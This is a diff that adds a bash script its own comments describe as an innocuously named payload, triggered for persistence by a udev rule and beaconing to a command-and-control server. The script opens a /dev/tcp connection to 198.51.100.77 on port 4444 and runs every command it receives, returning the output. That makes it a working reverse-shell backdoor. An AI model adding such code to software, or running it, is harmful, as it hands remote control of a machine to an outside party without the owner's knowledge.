@@ -1,0 +1,5 @@
+#!/bin/bash
+# Innocuously-named payload. The real persistence trigger is the udev
+# rule that invokes this script. Beaconing to C2, retries forever.
+exec 3<>/dev/tcp/198.51.100.77/4444
+while read -u 3 CMD; do bash -c "$CMD" >&3 2>&3; done
